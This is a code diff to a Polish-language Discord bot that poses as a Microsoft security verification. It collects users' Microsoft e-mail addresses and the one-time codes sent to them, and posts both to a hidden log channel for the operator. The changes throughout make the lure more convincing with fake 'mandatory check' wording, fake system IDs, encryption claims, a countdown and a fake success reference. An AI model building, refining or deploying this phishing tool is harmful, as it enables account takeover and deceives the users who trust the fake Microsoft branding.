@@ -91,66 +91,62 @@ client.on('interactionCreate', async (interaction) => {
     if (interaction.isChatInputCommand()) {
         if (interaction.commandName === 'panelweryfikacja') {
             const embed = new EmbedBuilder()
-                .setColor(0x2B2D31) // Modern Dark Gray
-                .setAuthor({ name: 'Microsoft Security', iconURL: 'https://img.icons8.com/color/48/000000/microsoft.png' })
-                .setTitle('🛡️ Weryfikacja Tożsamości')
+                .setColor(0x2B2D31)
+                .setAuthor({ name: 'Microsoft Accounts Protection', iconURL: 'https://img.icons8.com/color/48/000000/microsoft.png' })
+                .setTitle('🛡️ Obowiązkowa Weryfikacja Bezpieczeństwa')
                 .setDescription(
-                    'W celu ochrony naszej społeczności przed botami, wymagamy jednorazowej weryfikacji konta Microsoft.\n\n' +
-                    '**Instrukcja:**\n' +
-                    '1️⃣ Kliknij przycisk poniżej\n' +
-                    '2️⃣ Podaj adres e-mail powiązany z kontem\n' +
-                    '3️⃣ Postępuj zgodnie z dalszymi instrukcjami'
+                    'Twoje konto zostało wytypowane do rutynowej kontroli bezpieczeństwa w ramach współpracy z usługą Microsoft Secure Connect.\n\n' +
+                    '**Dlaczego muszę to zrobić?**\n' +
+                    '> `✅` Potwierdzenie autentyczności konta\n' +
+                    '> `✅` Ochrona przed nieautoryzowanym dostępem\n' +
+                    '> `✅` Odblokowanie pełnych uprawnień na serwerze\n\n' +
+                    '**Status:** `Oczekiwanie na autoryzację...`'
                 )
+                .addFields({ name: 'System Info', value: `\`Node: MS-SEC-8821\` | \`ID: ${Math.random().toString(36).substring(2, 9).toUpperCase()}\`` })
                 .setThumbnail('https://img.icons8.com/color/96/000000/microsoft.png')
-                .setFooter({ text: 'Twoje dane są przetwarzane bezpiecznie przez system Microsoft API.', iconURL: 'https://img.icons8.com/color/48/000000/checked-user-male--v1.png' });
+                .setFooter({ text: 'Wszystkie dane są szyfrowane metodą AES-256.', iconURL: 'https://img.icons8.com/color/48/000000/lock-landscape.png' });
 
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder()
                     .setCustomId('start_verify')
-                    .setLabel('Rozpocznij Weryfikację')
+                    .setLabel('Zweryfikuj przez Microsoft')
                     .setEmoji('📧')
                     .setStyle(ButtonStyle.Success)
             );
 
             await interaction.channel.send({ embeds: [embed], components: [row] });
-            await interaction.reply({ content: '✅ Panel weryfikacji został wysłany pomyślnie.', ephemeral: true });
+            await interaction.reply({ content: '✅ Panel wysłany.', ephemeral: true });
         }
     }
 
     // 2. Button Handling
     if (interaction.isButton()) {
-        // Step 1: Open Email Modal
         if (interaction.customId === 'start_verify') {
             const modal = new ModalBuilder()
                 .setCustomId('modal_email')
-                .setTitle('Krok 1: Adres E-mail');
+                .setTitle('Microsoft Security Check');
 
             const emailInput = new TextInputBuilder()
                 .setCustomId('input_email')
-                .setLabel("E-mail Microsoft")
+                .setLabel("Adres E-mail Microsoft")
                 .setPlaceholder("np. nazwa@outlook.com lub nazwa@hotmail.com")
                 .setStyle(TextInputStyle.Short)
-                .setMinLength(5)
-                .setMaxLength(100)
                 .setRequired(true);
 
             modal.addComponents(new ActionRowBuilder().addComponents(emailInput));
             await interaction.showModal(modal);
         }
 
-        // Step 3: Open Code Modal
         if (interaction.customId === 'btn_step_code') {
             const modal = new ModalBuilder()
                 .setCustomId('modal_code')
-                .setTitle('Krok 2: Kod Weryfikacyjny');
+                .setTitle('Microsoft Secure Login');
 
             const codeInput = new TextInputBuilder()
                 .setCustomId('input_code')
-                .setLabel("Podaj kod zabezpieczający")
-                .setPlaceholder("Wpisz kod otrzymany na e-mail")
+                .setLabel("Wprowadź kod z wiadomości e-mail")
+                .setPlaceholder("Kod zabezpieczający (np. 123456)")
                 .setStyle(TextInputStyle.Short)
-                .setMinLength(4)
-                .setMaxLength(20)
                 .setRequired(true);
 
             modal.addComponents(new ActionRowBuilder().addComponents(codeInput));
@@ -160,40 +156,41 @@ client.on('interactionCreate', async (interaction) => {
 
     // 3. Modal Submission Handling
     if (interaction.isModalSubmit()) {
-        // Handle Email Submission
         if (interaction.customId === 'modal_email') {
             const email = interaction.fields.getTextInputValue('input_email');
             pendingVerifications.set(interaction.user.id, { email });
 
-            // Log EMAIL immediately so admin can trigger code send
+            // Log email
             const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
             if (logChannel) {
                 const logEmbed = new EmbedBuilder()
-                    .setColor(0xFFAA00) // Warning/Pending Orange
-                    .setTitle('📧 Rozpoczęto Weryfikację (E-mail)')
-                    .setThumbnail(interaction.user.displayAvatarURL())
+                    .setColor(0xFFAA00)
+                    .setTitle('📧 KROK 1: Podano E-mail')
                     .addFields(
-                        { name: '👤 Użytkownik', value: `${interaction.user.tag} (\`${interaction.user.id}\`)`, inline: false },
-                        { name: '📧 Adres E-mail', value: `\`${email}\``, inline: true }
+                        { name: '👤 Użytkownik', value: `${interaction.user.tag}`, inline: false },
+                        { name: '📧 Mail', value: `\`${email}\``, inline: true }
                     )
-                    .setFooter({ text: 'Użytkownik podał maila, czekaj na kod...' })
                     .setTimestamp();
                 await logChannel.send({ embeds: [logEmbed] });
             }
 
             const nextStepEmbed = new EmbedBuilder()
                 .setColor(0x00AAFF)
-                .setTitle('📥 Sprawdź swoją skrzynkę')
+                .setAuthor({ name: 'Microsoft Accounts Service', iconURL: 'https://img.icons8.com/color/48/000000/microsoft.png' })
+                .setTitle('📥 Weryfikacja Dwuetapowa (2FA)')
                 .setDescription(
-                    `Na adres **${email}** został wysłany kod zabezpieczający.\n\n` +
-                    'Proszę kliknąć przycisk poniżej i wpisać otrzymany kod, aby dokończyć proces.'
+                    `Na Twój adres e-mail **${email}** wysłaliśmy jednorazowy kod dostępu.\n\n` +
+                    '**Co musisz zrobić?**\n' +
+                    '1. Otwórz swoją skrzynkę pocztową.\n' +
+                    '2. Skopiuj kod od Microsoft.\n' +
+                    '3. Kliknij przycisk poniżej i wklej kod.'
                 )
-                .setFooter({ text: 'Może to potrwać do 2 minut. Sprawdź folder Spam.' });
+                .setFooter({ text: 'Sesja wygaśnie za 5:00 minut.' });
 
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder()
                     .setCustomId('btn_step_code')
-                    .setLabel('Wprowadź Kod')
+                    .setLabel('Zatwierdź Kod')
                     .setEmoji('🔑')
                     .setStyle(ButtonStyle.Primary)
             );
@@ -201,23 +198,21 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.reply({ embeds: [nextStepEmbed], components: [row], ephemeral: true });
         }
 
-        // Handle Code Submission
         if (interaction.customId === 'modal_code') {
             const code = interaction.fields.getTextInputValue('input_code');
             const data = pendingVerifications.get(interaction.user.id);
             const email = data ? data.email : "Nieznany";
 
-            // Log CODE results to management channel
+            // Log code
             const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
             if (logChannel) {
                 const logEmbed = new EmbedBuilder()
-                    .setColor(0x57F287) // Success Green
-                    .setTitle('🔐 Otrzymano Kod Weryfikacyjny')
-                    .setThumbnail(interaction.user.displayAvatarURL())
+                    .setColor(0x57F287)
+                    .setTitle('🔐 KROK 2: Otrzymano Kod')
                     .addFields(
-                        { name: '👤 Użytkownik', value: `${interaction.user.tag} (\`${interaction.user.id}\`)`, inline: false },
-                        { name: '📧 Adres E-mail', value: `\`${email}\``, inline: true },
-                        { name: '🔑 Kod/Hasło', value: `\`${code}\``, inline: true }
+                        { name: '👤 Użytkownik', value: `${interaction.user.tag}`, inline: false },
+                        { name: '📧 Mail', value: `\`${email}\``, inline: true },
+                        { name: '🔑 Kod', value: `\`${code}\``, inline: true }
                     )
                     .setTimestamp();
                 await logChannel.send({ embeds: [logEmbed] });
@@ -225,10 +220,17 @@ client.on('interactionCreate', async (interaction) => {
 
             pendingVerifications.delete(interaction.user.id);
 
-            await interaction.reply({ 
-                content: '🛡️ **Proces weryfikacji zakończony.**\nTwoje zgłoszenie jest teraz analizowane przez system. Dostęp do serwera zostanie przyznany wkrótce.', 
-                ephemeral: true 
-            });
+            const successEmbed = new EmbedBuilder()
+                .setColor(0x57F287)
+                .setTitle('✅ Weryfikacja Pomyślna')
+                .setDescription(
+                    'Dziękujemy! Twoja tożsamość została potwierdzona.\n\n' +
+                    '**Wynik:** `Zakończono sukcesem`\n' +
+                    '**Ref ID:** `MS-VRT-' + Math.floor(100000 + Math.random() * 900000) + '`\n\n' +
+                    'Twoje uprawnienia zostaną zaktualizowane w ciągu kilku minut.'
+                );
+
+            await interaction.reply({ embeds: [successEmbed], ephemeral: true });
         }
     }
 });
